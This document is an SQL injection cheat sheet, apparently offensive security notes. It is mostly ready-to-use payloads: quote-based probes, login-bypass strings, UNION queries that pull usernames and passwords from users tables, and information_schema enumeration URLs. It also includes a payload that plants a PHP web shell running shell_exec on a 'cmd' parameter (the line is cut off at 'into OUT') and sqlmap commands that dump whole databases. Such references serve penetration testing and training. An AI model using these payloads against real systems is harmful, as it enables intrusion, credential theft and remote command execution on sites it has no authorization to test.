# SQL Injection

## Basic technique

Stick `'` in a parameter and see if it throws a database error (and note what kind).

Another simple test:

```
' or '1'='1
```

Other tests:

```
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```

## Retrieving Hidden Data

```
https://insecure-website.com/products?category=Gifts'--
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

## Bypassing Authentication

```
username' or 1=1;#
username'--
username' or 1=1 --
```

## Retrieving Data from Other DB Tables

[SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

When performing an SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
-----------------------------------
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.

// For Oracle
' UNION SELECT NULL FROM DUAL--
```

Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

```
' UNION SELECT username, password FROM users--
```

## Retrieving multiple values within a single column <a href="#retrieving-multiple-values-within-a-single-column" id="retrieving-multiple-values-within-a-single-column"></a>

Suppose instead that the query only returns a single column. You can easily retrieve multiple values together within this single column by concatenating the values together.

{% code title="On Oracle" %}
```
' UNION SELECT username || '~' || password FROM users--
```
{% endcode %}

## Database enumeration

[Examining the Database](https://portswigger.net/web-security/sql-injection/examining-the-database)

The exact syntax for injection will vary by database type.

Get version:

```
http://[host]/inject.php?id=1 union all select 1,2,3,@@version,5
```

Get the current user:

```
http://[host]/inject.php?id=1 union all select 1,2,3,user(),5
```

See all tables:

```
http://[host]/inject.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables
```

Get column names for a specified table:

```
http://[host]/inject.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'
```

Get usernames and passwords (0x3a means `:`):

```
http://[host]/inject.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5 from users
```

You might be able to write to system files depending on permission levels using MySQL's `INTO OUTFILE` function to create a php shell in the web root:

```
http://[host]/inject.php?id=54 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUT
```

## Blind SQL injection

{% embed url="https://portswigger.net/web-security/sql-injection/blind" %}

## SQLmap

Assuming you've tested a parameter with `'` and it is injectable, run SQL map against the URL:

```
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dbms=mysql
```

It may not run unless you specify the database type.

Get the databases:

```
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dbs --dbms=mysql
```

Get the tables in a database:

```
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --tables -D [database name]
```

Get the columns in a table:

```
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --columns -D [database name] -T [table name]
```

Dump a table:

```
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dump -D [database name] -T [table name]
```

### Passing tokens

If the URL isn't accessible, you can pass cookie data or authentication credentials to SQLmap by pasting the post request in a file and using the `-r` option:

```
sqlmap -r request.txt
```

## Resources

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" %}

{% embed url="https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb" %}

{% embed url="https://www.binarytides.com/sqlmap-hacking-tutorial/" %}
